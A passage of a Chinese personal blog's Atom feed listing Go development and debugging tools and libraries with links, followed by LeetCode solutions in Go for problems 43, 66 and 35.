href="https://www.jetbrains.com/pycharm/">https://www.jetbrains.com/pycharm/</a></p><p>PhpStorm  <a href="https://www.jetbrains.com/phpstorm/">https://www.jetbrains.com/phpstorm/</a></p><hr><h3 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h3><p>下载链接 <a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p><hr><h3 id="navicat"><a href="#navicat" class="headerlink" title="navicat"></a>navicat</h3><p>下载链接 <a href="http://www.navicat.com.cn/store/navicat-premium">http://www.navicat.com.cn/store/navicat-premium</a></p><hr><h3 id="sublime"><a href="#sublime" class="headerlink" title="sublime"></a>sublime</h3><p><a href="http://www.sublimetext.com/3">http://www.sublimetext.com/3</a></p><hr><h3 id="visio-amp-processon-com"><a href="#visio-amp-processon-com" class="headerlink" title="visio &amp; processon.com"></a>visio &amp; processon.com</h3><p>绘图软件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常用工具&quot;&gt;&lt;a href=&quot;#常用工具&quot; class=&quot;headerlink&quot; title=&quot;常用工具&quot;&gt;&lt;/a&gt;常用工具&lt;/h1&gt;&lt;hr&gt;
&lt;h3 id=&quot;git&quot;&gt;&lt;a href=&quot;#git&quot; class=&quot;headerlink&quot; title=&quot;git&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="工具包" scheme="https://lennon.work/categories/%E5%B7%A5%E5%85%B7%E5%8C%85/"/>
    
    
    <category term="自用" scheme="https://lennon.work/tags/%E8%87%AA%E7%94%A8/"/>
    
    <category term="redis" scheme="https://lennon.work/tags/redis/"/>
    
    <category term="elasticsearch" scheme="https://lennon.work/tags/elasticsearch/"/>
    
    <category term="shell" scheme="https://lennon.work/tags/shell/"/>
    
    <category term="mongo" scheme="https://lennon.work/tags/mongo/"/>
    
  </entry>
  
  <entry>
    <title>常用工具包汇总二</title>
    <link href="https://lennon.work/2021/04/11/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8C%85%E6%B1%87%E6%80%BB/"/>
    <id>https://lennon.work/2021/04/11/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8C%85%E6%B1%87%E6%80%BB/</id>
    <published>2021-04-11T14:58:54.398Z</published>
    <updated>2021-01-25T12:01:35.301Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一-开发工具"><a href="#一-开发工具" class="headerlink" title="一. 开发工具"></a><strong>一. 开发工具</strong></h2><p><strong>1)sql2go</strong><br>用于将 sql 语句转换为 golang 的 struct. 使用 ddl 语句即可。<br>例如对于创建表的语句: show create table xxx. 将输出的语句，直接粘贴进去就行。<br><a href="http://stming.cn/tool/sql2go.html">http://stming.cn/tool/sql2go.html</a></p><p><strong>2)toml2go</strong><br>用于将编码后的 toml 文本转换问 golang 的 struct.<br><a href="https://xuri.me/toml-to-go/">https://xuri.me/toml-to-go/</a></p><p><strong>3)curl2go</strong><br>用来将 curl 命令转化为具体的 golang 代码.<br><a href="https://mholt.github.io/curl-to-go/">https://mholt.github.io/curl-to-go/</a></p><p><strong>4)json2go</strong><br>用于将 json 文本转换为 struct.<br><a href="https://mholt.github.io/json-to-go/">https://mholt.github.io/json-to-go/</a></p><p><strong>5)mysql 转 ES 工具</strong><br><a href="http://www.ischoolbar.com/EsParser/">http://www.ischoolbar.com/EsParser/</a></p><p><strong>6)golang</strong><br>模拟模板的工具，在支持泛型之前，可以考虑使用。<br><a href="https://github.com/cheekybits/genny">https://github.com/cheekybits/genny</a></p><p><strong>7)查看某一个库的依赖情况，类似于 go list 功能</strong><br><a href="https://github.com/KyleBanks/depth">https://github.com/KyleBanks/depth</a></p><p><strong>8)一个好用的文件压缩和解压工具，集成了 zip，tar 等多种功能，主要还有跨平台。</strong><br><a href="https://github.com/mholt/archiver">https://github.com/mholt/archiver</a></p><p><strong>9)go 内置命令</strong><br>go list 可以查看某一个包的依赖关系.<br>go vet 可以检查代码不符合 golang 规范的地方。</p><p><strong>10)热编译工具</strong><br><a href="https://github.com/silenceper/gowatch">https://github.com/silenceper/gowatch</a></p><p><strong>11)revive</strong><br>golang 代码质量检测工具<br><a href="https://github.com/mgechev/revive">https://github.com/mgechev/revive</a></p><p><strong>12)Go Callvis</strong><br>golang 的代码调用链图工具<br><a href="https://github.com/TrueFurby/go-callvis">https://github.com/TrueFurby/go-callvis</a></p><p><strong>13)Realize</strong><br>开发流程改进工具<br><a href="https://github.com/oxequa/realize">https://github.com/oxequa/realize</a></p><p><strong>14)Gotests</strong><br>自动生成测试用例工具<br><a href="https://github.com/cweill/gotests">https://github.com/cweill/gotests</a></p><h2 id="二-调试工具"><a href="#二-调试工具" class="headerlink" title="二.调试工具"></a><strong>二.调试工具</strong></h2><p><strong>1)perf</strong><br>代理工具，支持内存，cpu，堆栈查看，并支持火焰图.<br>perf 工具和 go-torch 工具，快捷定位程序问题.<br><a href="https://github.com/uber-archive/go-torch">https://github.com/uber-archive/go-torch</a><br><a href="https://github.com/google/gops">https://github.com/google/gops</a></p><p><strong>2)dlv 远程调试</strong><br>基于 goland+dlv 可以实现远程调式的能力.<br><a href="https://github.com/go-delve/delve">https://github.com/go-delve/delve</a><br>提供了对 golang 原生的支持，相比 gdb 调试，简单太多。</p><p><strong>3)网络代理工具</strong><br>goproxy 代理，支持多种协议，支持 ssh 穿透和 kcp 协议.<br><a href="https://github.com/snail007/goproxy">https://github.com/snail007/goproxy</a></p><p><strong>4)抓包工具</strong><br>go-sniffer 工具，可扩展的抓包工具，可以开发自定义协议的工具包. 现在只支持了 http，mysql，redis，mongodb.<br>基于这个工具，我们开发了 qapp 协议的抓包。<br><a href="https://github.com/40t/go-sniffer">https://github.com/40t/go-sniffer</a></p><p><strong>5)反向代理工具，快捷开放内网端口供外部使用。</strong><br>ngrok 可以让内网服务外部调用<br><a href="https://ngrok.com/">https://ngrok.com/</a><br><a href="https://github.com/inconshreveable/ngrok">https://github.com/inconshreveable/ngrok</a></p><p><strong>6)配置化生成证书</strong><br>从根证书，到业务侧证书一键生成.<br><a href="https://github.com/cloudflare/cfssl">https://github.com/cloudflare/cfssl</a></p><p><strong>7)免费的证书获取工具</strong><br>基于 acme 协议，从 letsencrypt 生成免费的证书，有效期 1 年，可自动续期。<br><a href="https://github.com/Neilpang/acme.sh">https://github.com/Neilpang/acme.sh</a></p><p>8)开发环境管理工具，单机搭建可移植工具的利器。支持多种虚拟机后端。<br><strong>vagrant</strong>常被拿来同 docker 相比，值得拥有。<br><a href="https://github.com/hashicorp/vagrant">https://github.com/hashicorp/vagrant</a></p><p><strong>9)轻量级容器调度工具</strong><br>nomad 可以非常方便的管理容器和传统应用，相比 k8s 来说，简单不要太多.<br><a href="https://github.com/hashicorp/nomad">https://github.com/hashicorp/nomad</a></p><p><strong>10)敏感信息和密钥管理工具</strong><br><a href="https://github.com/hashicorp/vault">https://github.com/hashicorp/vault</a></p><p><strong>11)高度可配置化的 http 转发工具，基于 etcd 配置。</strong><br><a href="https://github.com/gojek/weaver">https://github.com/gojek/weaver</a></p><p><strong>12)进程监控工具 supervisor</strong><br><a href="https://www.jianshu.com/p/39b476e808d8">https://www.jianshu.com/p/39b476e808d8</a></p><p><strong>13)基于</strong>procFile<strong>进程管理工具. 相比 supervisor 更加简单。</strong><br><a href="https://github.com/ddollar/foreman">https://github.com/ddollar/foreman</a></p><p><strong>14)基于 http，https，websocket 的</strong>调试代理工具<strong>，配置功能丰富。在线教育的 nohost web 调试工具，基于此开发.</strong><br><a href="https://github.com/avwo/whistle">https://github.com/avwo/whistle</a></p><p><strong>15)分布式调度工具</strong><br><a href="https://github.com/shunfei/cronsun/blob/master/README_ZH.md">https://github.com/shunfei/cronsun/blob/master/README_ZH.md</a><br><a href="https://github.com/ouqiang/gocron">https://github.com/ouqiang/gocron</a></p><p><strong>16)自动化运维平台 Gaia</strong><br><a href="https://github.com/gaia-pipeline/gaia">https://github.com/gaia-pipeline/gaia</a></p><h2 id="三-常用网站"><a href="#三-常用网站" class="headerlink" title="三. 常用网站"></a><strong>三. 常用网站</strong></h2><p>go 百科全书: <a href="https://awesome-go.com/">https://awesome-go.com/</a><br>json 解析: <a href="https://www.json.cn/">https://www.json.cn/</a><br>出口 IP: <a href="https://ipinfo.io/">https://ipinfo.io/</a><br>redis 命令: <a href="http://doc.redisfans.com/">http://doc.redisfans.com/</a><br>ES 命令首页: <a href="https://www.elastic.co/guide/cn/elasticsearch/guide/current/index.html">https://www.elastic.co/guide/cn/elasticsearch/guide/current/index.html</a><br>UrlEncode: <a href="http://tool.chinaz.com/Tools/urlencode.aspx">http://tool.chinaz.com/Tools/urlencode.aspx</a><br>Base64: <a href="https://tool.oschina.net/encrypt%3Ftype%3D3">https://tool.oschina.net/encrypt?type=3</a><br>Guid: <a href="https://www.guidgen.com/">https://www.guidgen.com/</a><br>常用工具: <a href="http://www.ofmonkey.com/">http://www.ofmonkey.com/</a></p><h2 id="四-golang-常用库"><a href="#四-golang-常用库" class="headerlink" title="四. golang 常用库"></a><strong>四. golang 常用库</strong></h2><p><strong>日志</strong><br><a href="https://github.com/Sirupsen/logrus">https://github.com/Sirupsen/logrus</a><br><a href="https://github.com/uber-go/zap">https://github.com/uber-go/zap</a></p><p><strong>配置</strong><br>兼容 json，toml，yaml，hcl 等格式的日志库.<br><a href="https://github.com/spf13/viper">https://github.com/spf13/viper</a></p><p><strong>存储</strong><br>mysql <a href="https://github.com/go-xorm/xorm">https://github.com/go-xorm/xorm</a><br>es <a href="https://github.com/elastic/elasticsearch">https://github.com/elastic/elasticsearch</a><br>redis <a href="https://github.com/gomodule/redigo">https://github.com/gomodule/redigo</a><br>mongo <a href="https://github.com/mongodb/mongo-go-driver">https://github.com/mongodb/mongo-go-driver</a><br>kafka <a href="https://github.com/Shopify/sarama">https://github.com/Shopify/sarama</a></p><p><strong>数据结构</strong><br><a href="https://github.com/emirpasic/gods">https://github.com/emirpasic/gods</a></p><p><strong>命令行</strong><br><a href="https://github.com/spf13/cobra">https://github.com/spf13/cobra</a></p><p><strong>框架</strong><br><a href="https://github.com/grpc/grpc-go">https://github.com/grpc/grpc-go</a><br><a href="https://github.com/gin-gonic/gin">https://github.com/gin-gonic/gin</a></p><p><strong>并发</strong><br><a href="https://github.com/Jeffail/tunny">https://github.com/Jeffail/tunny</a><br><a href="https://github.com/benmanns/goworker">https://github.com/benmanns/goworker</a><br>现在我们框架在用的，虽然 star 不多，但是确实好用，当然还可以更好用.<br><a href="https://github.com/rafaeldias/async">https://github.com/rafaeldias/async</a></p><p><strong>工具</strong><br>定义了实用的判定类，以及针对结构体的校验逻辑，避免业务侧写复杂的代码.<br><a href="https://github.com/asaskevich/govalidator">https://github.com/asaskevich/govalidator</a><br><a href="https://github.com/bytedance/go-tagexpr">https://github.com/bytedance/go-tagexpr</a></p><p>protobuf 文件动态解析的接口，可以实现反射相关的能力。<br><a href="https://github.com/jhump/protoreflect">https://github.com/jhump/protoreflect</a></p><p><strong>表达式引擎工具</strong><br><a href="https://github.com/Knetic/govaluate">https://github.com/Knetic/govaluate</a><br><a href="https://github.com/google/cel-go">https://github.com/google/cel-go</a></p><p><strong>字符串处理</strong><br><a href="https://github.com/huandu/xstrings">https://github.com/huandu/xstrings</a></p><p><strong>ratelimit 工具</strong><br><a href="https://github.com/uber-go/ratelimit">https://github.com/uber-go/ratelimit</a><br><a href="https://blog.csdn.net/chenchongg/article/details/85342086">https://blog.csdn.net/chenchongg/article/details/85342086</a><br><a href="https://github.com/juju/ratelimit">https://github.com/juju/ratelimit</a></p><p><strong>golang 熔断的库</strong><br>熔断除了考虑频率限制，还要考虑 qps，出错率等其他东西.<br><a href="https://github.com/afex/hystrix-go">https://github.com/afex/hystrix-go</a><br><a href="https://github.com/sony/gobreaker">https://github.com/sony/gobreaker</a></p><p><strong>表格</strong><br><a href="https://github.com/chenjiandongx/go-echarts">https://github.com/chenjiandongx/go-echarts</a></p><p><strong>tail 工具库</strong><br><a href="https://github.com/hpcloud/taglshi">https://github.com/hpcloud/taglshi</a></p><h2 id="五-网络工具"><a href="#五-网络工具" class="headerlink" title="五. 网络工具"></a><strong>五. 网络工具</strong></h2><p><img src="/img/tools/nettools.jpg" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一-开发工具&quot;&gt;&lt;a href=&quot;#一-开发工具&quot; class=&quot;headerlink&quot; title=&quot;一. 开发工具&quot;&gt;&lt;/a&gt;&lt;strong&gt;一. 开发工具&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1)sql2go&lt;/strong&gt;&lt;br&gt;用于将 sq</summary>
      
    
    
    
    <category term="工具包" scheme="https://lennon.work/categories/%E5%B7%A5%E5%85%B7%E5%8C%85/"/>
    
    
    <category term="golang" scheme="https://lennon.work/tags/golang/"/>
    
    <category term="工具包" scheme="https://lennon.work/tags/%E5%B7%A5%E5%85%B7%E5%8C%85/"/>
    
    <category term="调试工具" scheme="https://lennon.work/tags/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    
    <category term="学习比较" scheme="https://lennon.work/tags/%E5%AD%A6%E4%B9%A0%E6%AF%94%E8%BE%83/"/>
    
  </entry>
  
  <entry>
    <title>43. 字符串相乘</title>
    <link href="https://lennon.work/2021/04/11/leetcode/leetcode43/"/>
    <id>https://lennon.work/2021/04/11/leetcode/leetcode43/</id>
    <published>2021-04-11T14:58:54.395Z</published>
    <updated>2021-01-23T08:48:08.847Z</updated>
    
    <content type="html"><![CDATA[<h3 id="leetcode题库-43-字符串相乘"><a href="#leetcode题库-43-字符串相乘" class="headerlink" title="leetcode题库 43. 字符串相乘"></a>leetcode题库 43. 字符串相乘</h3><hr><h4 id="原题信息"><a href="#原题信息" class="headerlink" title="原题信息"></a>原题信息</h4><hr><h5 id="原题链接"><a href="#原题链接" class="headerlink" title="原题链接:"></a>原题链接:</h5><blockquote><p><a href="https://leetcode-cn.com/problems/multiply-strings/">https://leetcode-cn.com/problems/multiply-strings/</a></p></blockquote><hr><h5 id="难度等级"><a href="#难度等级" class="headerlink" title="难度等级"></a>难度等级</h5><blockquote><p>中等</p></blockquote><hr><h5 id="原题描述"><a href="#原题描述" class="headerlink" title="原题描述"></a>原题描述</h5><blockquote><p>给定两个以字符串形式表示的非负整数 num1 和 num2，返回 num1 和 num2 的乘积，它们的乘积也表示为字符串形式。</p></blockquote><p><img src="/img/lennon43/example.png" alt="example1"></p><hr><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><hr><h5 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h5><blockquote></blockquote><hr><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">multiply</span><span class="params">(num1 <span class="keyword">string</span>, num2 <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> num1 == <span class="string">&quot;0&quot;</span> || num2 == <span class="string">&quot;0&quot;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result [<span class="number">110</span> + <span class="number">110</span>]<span class="keyword">int</span></span><br><span class="line">length := (<span class="built_in">len</span>(num1) - <span class="number">1</span>) + (<span class="built_in">len</span>(num2) - <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i1 := <span class="built_in">len</span>(num1) - <span class="number">1</span>; i1 &gt;= <span class="number">0</span>; i1-- &#123;</span><br><span class="line"><span class="keyword">for</span> i2 := <span class="built_in">len</span>(num2) - <span class="number">1</span>; i2 &gt;= <span class="number">0</span>; i2-- &#123;</span><br><span class="line">numx := (<span class="keyword">int</span>(num1[i1]) - <span class="number">48</span>) * (<span class="keyword">int</span>(num2[i2]) - <span class="number">48</span>)</span><br><span class="line"><span class="keyword">if</span> numx &gt;= <span class="number">10</span> &#123;</span><br><span class="line">result[i1+i2+<span class="number">1</span>] += numx % <span class="number">10</span></span><br><span class="line">result[i1+i2] += numx / <span class="number">10</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">result[i1+i2+<span class="number">1</span>] += numx</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i3 := i1 + i2 + <span class="number">1</span>; i3 &gt;= <span class="number">0</span>; i3-- &#123;</span><br><span class="line">temp := result[i3]</span><br><span class="line"><span class="keyword">if</span> temp &gt;= <span class="number">10</span> &#123;</span><br><span class="line">result[i3] = temp % <span class="number">10</span></span><br><span class="line">result[i3<span class="number">-1</span>] += temp / <span class="number">10</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">str := <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i3 := <span class="number">0</span>; i3 &lt;= length; i3++ &#123;</span><br><span class="line">str += <span class="keyword">string</span>(result[i3] + <span class="number">48</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> str[<span class="number">0</span>] == <span class="number">48</span> &#123;</span><br><span class="line">str = str[<span class="number">1</span>:]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h5 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h5><p><a href="https://github.com/lennon-liu/leetcode/tree/main/lennon43">https://github.com/lennon-liu/leetcode/tree/main/lennon43</a></p><hr><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/img/lennon43/lennon43.png" alt="lennon2"></p><hr><h4 id="优化与总结"><a href="#优化与总结" class="headerlink" title="优化与总结"></a>优化与总结</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><hr><blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;leetcode题库-43-字符串相乘&quot;&gt;&lt;a href=&quot;#leetcode题库-43-字符串相乘&quot; class=&quot;headerlink&quot; title=&quot;leetcode题库 43. 字符串相乘&quot;&gt;&lt;/a&gt;leetcode题库 43. 字符串相乘&lt;/h3&gt;&lt;hr</summary>
      
    
    
    
    <category term="leetcode" scheme="https://lennon.work/categories/leetcode/"/>
    
    
    <category term="中等难度" scheme="https://lennon.work/tags/%E4%B8%AD%E7%AD%89%E9%9A%BE%E5%BA%A6/"/>
    
    <category term="golang实现" scheme="https://lennon.work/tags/golang%E5%AE%9E%E7%8E%B0/"/>
    
    <category term="数组" scheme="https://lennon.work/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>leetcode题库 66. 加一</title>
    <link href="https://lennon.work/2021/04/11/leetcode/leetcode66/"/>
    <id>https://lennon.work/2021/04/11/leetcode/leetcode66/</id>
    <published>2021-04-11T14:58:54.394Z</published>
    <updated>2021-01-23T08:48:16.729Z</updated>
    
    <content type="html"><![CDATA[<h3 id="leetcode题库-66-加一"><a href="#leetcode题库-66-加一" class="headerlink" title="leetcode题库 66. 加一"></a>leetcode题库 66. 加一</h3><hr><h4 id="原题信息"><a href="#原题信息" class="headerlink" title="原题信息"></a>原题信息</h4><hr><h5 id="原题链接"><a href="#原题链接" class="headerlink" title="原题链接:"></a>原题链接:</h5><blockquote><p><a href="https://leetcode-cn.com/problems/search-insert-position/">https://leetcode-cn.com/problems/search-insert-position/</a></p></blockquote><hr><h5 id="难度等级"><a href="#难度等级" class="headerlink" title="难度等级"></a>难度等级</h5><blockquote><p>中等</p></blockquote><hr><h5 id="原题描述"><a href="#原题描述" class="headerlink" title="原题描述"></a>原题描述</h5><blockquote><p>给定一个由 整数 组成的 非空 数组所表示的非负整数，在该数的基础上加一。</p><p>最高位数字存放在数组的首位， 数组中每个元素只存储单个数字。</p><p>你可以假设除了整数 0 之外，这个整数不会以零开头。</p></blockquote><p><img src="/img/lennon66/example.png" alt="example1"></p><blockquote><p>提示：<br>1 &lt;= digits.length &lt;= 100<br>0 &lt;= digits[i] &lt;= 9</p></blockquote><hr><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><hr><h5 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h5><blockquote></blockquote><hr><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">plusOne</span><span class="params">(digits []<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">digits[<span class="built_in">len</span>(digits)<span class="number">-1</span>] = digits[<span class="built_in">len</span>(digits)<span class="number">-1</span>] + <span class="number">1</span></span><br><span class="line">max := <span class="built_in">len</span>(digits) - <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">if</span> digits[max] == <span class="number">10</span> &#123;</span><br><span class="line"><span class="keyword">if</span> max == <span class="number">0</span> &#123;</span><br><span class="line">digits[max] = <span class="number">0</span></span><br><span class="line">digits = <span class="built_in">append</span>([]<span class="keyword">int</span>&#123;<span class="number">1</span>&#125;, digits...)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">digits[max] = <span class="number">0</span></span><br><span class="line">digits[max<span class="number">-1</span>] = digits[max<span class="number">-1</span>] + <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> max &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">max -= <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> digits</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h5 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h5><blockquote><p><a href="https://github.com/lennon-liu/leetcode/tree/main/lennon35">https://github.com/lennon-liu/leetcode/tree/main/lennon35</a></p></blockquote><hr><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/img/lennon66/lennon66.png" alt="lennon2"></p><hr><h4 id="优化与总结"><a href="#优化与总结" class="headerlink" title="优化与总结"></a>优化与总结</h4><blockquote></blockquote><hr><blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;leetcode题库-66-加一&quot;&gt;&lt;a href=&quot;#leetcode题库-66-加一&quot; class=&quot;headerlink&quot; title=&quot;leetcode题库 66. 加一&quot;&gt;&lt;/a&gt;leetcode题库 66. 加一&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;原题</summary>
      
    
    
    
    <category term="leetcode" scheme="https://lennon.work/categories/leetcode/"/>
    
    
    <category term="golang实现" scheme="https://lennon.work/tags/golang%E5%AE%9E%E7%8E%B0/"/>
    
    <category term="简单难度" scheme="https://lennon.work/tags/%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6/"/>
    
    <category term="数组" scheme="https://lennon.work/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>leetcode题库 35. 搜索插入位置</title>
    <link href="https://lennon.work/2021/04/11/leetcode/leetcode35/"/>
    <id>https://lennon.work/2021/04/11/leetcode/leetcode35/</id>
    <published>2021-04-11T14:58:54.392Z</published>
    <updated>2021-01-23T08:48:23.488Z</updated>
    
    <content type="html"><![CDATA[<h3 id="leetcode题库-35-搜索插入位置"><a href="#leetcode题库-35-搜索插入位置" class="headerlink" title="leetcode题库 35. 搜索插入位置"></a>leetcode题库 35. 搜索插入位置</h3><hr><h4 id="原题信息"><a href="#原题信息" class="headerlink" title="原题信息"></a>原题信息</h4><hr><h5 id="原题链接"><a href="#原题链接" class="headerlink" title="原题链接:"></a>原题链接:</h5><blockquote><p><a href="https://leetcode-cn.com/problems/search-insert-position/">https://leetcode-cn.com/problems/search-insert-position/</a></p></blockquote><hr><h5 id="难度等级"><a href="#难度等级" class="headerlink" title="难度等级"></a>难度等级</h5><blockquote><p>简单</p></blockquote><hr><h5 id="原题描述"><a href="#原题描述" class="headerlink" title="原题描述"></a>原题描述</h5><blockquote><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>你可以假设数组中无重复元素。</p></blockquote><p><img src="/img/lennon35/example.png" alt="example1"></p><hr><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><hr><h5 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h5><blockquote></blockquote><hr><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">searchInsert</span><span class="params">(nums []<span class="keyword">int</span>, target <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> i, n <span class="keyword">int</span></span><br><span class="line"><span class="keyword">for</span> i, n = <span class="keyword">range</span> nums &#123;</span><br><span class="line"><span class="keyword">if</span> target &lt;= n &#123;</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> i + <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h5 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h5><blockquote><p><a href="https://github.com/lennon-liu/leetcode/tree/main/lennon35">https://github.com/lennon-liu/leetcode/tree/main/lennon35</a></p></blockquote><hr><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/img/lennon35/lennon35.png" alt="lennon2"></p><hr><h4 id="优化与总结"><a href="#优化与总结" class="headerlink" title="优化与总结"></a>优化与总结</h4><blockquote></blockquote><hr><blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;leetcode题库-35-搜索插入位置&quot;&gt;&lt;a href=&quot;#leetcode题库-35-搜索插入位置&quot; class=&quot;headerlink&quot; title=&quot;leetcode题库 35. 搜索插入位置&quot;&gt;&lt;/a&gt;leetcode题库 35. 搜索插入位置&lt;/h3</summary>
      
    
    
    
    <category term="leetcode" scheme="https://lennon.work/categories/leetcode/"/>
    
    
    <category term="golang实现" scheme="https://lennon.work/tags/golang%E5%AE%9E%E7%8E%B0/"/>
    
    <category term="简单难度" scheme="https://lennon.work/tags/%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6/"/>
    
    <category term="数组" scheme="https://lennon.work/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>28. 实现 strStr()</title>
    <link href="https://lennon.work/2021/04/11/leetcode/leetcode28/"/>
    <id>https://lennon.work/2021/04/11/leetcode/leetcode28/</id>
    <published>2021-04-11T14:58:54.391Z</published>
